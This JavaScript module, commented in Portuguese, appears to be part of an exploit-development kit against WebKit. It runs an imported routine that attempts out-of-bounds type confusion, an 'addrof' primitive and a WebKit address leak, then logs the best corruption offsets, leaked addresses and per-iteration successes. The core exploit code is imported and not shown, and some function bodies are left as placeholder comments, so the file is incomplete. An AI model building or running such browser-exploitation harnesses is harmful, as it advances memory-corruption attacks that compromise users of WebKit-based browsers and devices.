// js/script3/runAllAdvancedTestsS3.mjs (Runner para Addrof via Corrupção ABV no Getter)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43,
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT
} from './testArrayBufferVictimCrash.mjs';

function safeToHexRunner(value, length = 8) { /* ... (como antes) ... */ }

async function runHeisenbugReproStrategy_TypedArrayVictim_R43_ABVCorruptInGetter() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R43_ABVCorruptInGetter";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    
    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R43();
    const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;

    if (result.errorOccurred && !result.oob_params_of_best_result) { /* ... (log de erro) ... */
        logS3(`  RUNNER R43(ABVCorrupt): ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: MainTest ERR!`;
    } else if (result) {
        logS3(`  RUNNER R43(ABVCorrupt): Teste completado. Analisando...`, "good", FNAME_RUNNER);
        logS3(`  --- MELHOR RESULTADO GERAL ---`, "info_emphasis", FNAME_RUNNER);
        let bestParamsMsg = 'N/A';
        if (result.oob_params_of_best_result) {
            bestParamsMsg = `TC Trig Offset: ${result.oob_params_of_best_result.tc_trigger_offset}, TC Trig Val: ${result.oob_params_of_best_result.tc_trigger_value}`;
            if (result.best_iter_addrof_details?.best_corrupt_offset_for_addrof) { // Se o addrof foi tentado e teve um "melhor offset de corrupção"
                bestParamsMsg += `, ABV Corrupt Off: ${result.best_iter_addrof_details.best_corrupt_offset_for_addrof}`;
            }
        }
        logS3(`    Melhores Parâmetros OOB Usados: ${bestParamsMsg}`, "info", FNAME_RUNNER);
        logS3(`    TC Confirmada (Melhor): ${result.heisenbug_on_M2_confirmed_by_tc_probe}`, result.heisenbug_on_M2_confirmed_by_tc_probe ? "vuln" : "info", FNAME_RUNNER);
        if (result.tc_probe_details) {
            logS3(`    Detalhes Sonda TC (Melhor): ${JSON.stringify(result.tc_probe_details)}`, "leak_detail", FNAME_RUNNER);
        }
        if (result.best_iter_addrof_details) {
            const ad = result.best_iter_addrof_details;
            logS3(`    Detalhes Addrof no Getter (Melhor):`, "info_emphasis", FNAME_RUNNER);
            logS3(`      Sucesso: ${ad.success}`, ad.success ? "success_major" : "warn", FNAME_RUNNER);
            logS3(`      Notas: ${ad.notes}`, "info", FNAME_RUNNER);
            if (ad.leaked_address_str) logS3(`      Endereço Vazado: ${ad.leaked_address_str}`, "leak", FNAME_RUNNER);
        }

        if (result.addrof_result) { logS3(`    Resultado Addrof (Global): ${result.addrof_result.msg}`, result.addrof_result.success ? "success_major" : "warn", FNAME_RUNNER); }
        if (result.webkit_leak_result) { logS3(`    Resultado WebKitLeak (Global): ${result.webkit_leak_result.msg}`, result.webkit_leak_result.success ? "success_major" : "info", FNAME_RUNNER); }
        if (result.errorOccurred) { logS3(`    Erro no Melhor Resultado: ${result.errorOccurred}`, "error", FNAME_RUNNER); }

        if (result.iteration_results_summary && result.iteration_results_summary.length > 0) {
            logS3(`  --- SUMÁRIO DE TODAS AS ITERAÇÕES (${result.iteration_results_summary.length} testadas) ---`, "info_emphasis", FNAME_RUNNER);
            result.iteration_results_summary.forEach((iter_sum, index) => {
                let logMsg = `    Iter ${index + 1} (TC Trig Off ${iter_sum.oob_tc_trigger_offset} Val ${iter_sum.oob_tc_trigger_value}): `;
                let highlights = [];
                if (iter_sum.heisenbug_on_M2_confirmed_by_tc_probe) highlights.push("TC_OK");
                if (iter_sum.addrof_success_this_iter) highlights.push("ADDROF_OK");
                if (iter_sum.webkit_leak_success_this_iter) highlights.push("WKLeak_OK");
                if (highlights.length === 0) highlights.push("Sem Efeitos Notáveis");
                logMsg += highlights.join(", ");
                if(iter_sum.error) logMsg += `, Err: ${iter_sum.error}`;
                logS3(logMsg, (iter_sum.addrof_success_this_iter || iter_sum.webkit_leak_success_this_iter) ? "success_major" : "info", FNAME_RUNNER);
            });
        }

        document.title = result.final_title_page || `${module_name_for_title} Final: Done`;
    } else { /* ... (log de resultado inválido) ... */ }

    logS3(`  Título da página final (definido pelo teste): ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() { /* ... (sem alteração significativa, apenas nomes) ... */
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_MainOrchestrator_ABVCorrupt`;
    logS3(`==== INICIANDO Script 3 R43_ABVCorrupt (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    await runHeisenbugReproStrategy_TypedArrayVictim_R43_ABVCorruptInGetter();
    logS3(`\n==== Script 3 R43_ABVCorrupt (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;
    // ... (lógica de título final do orchestrator)
}
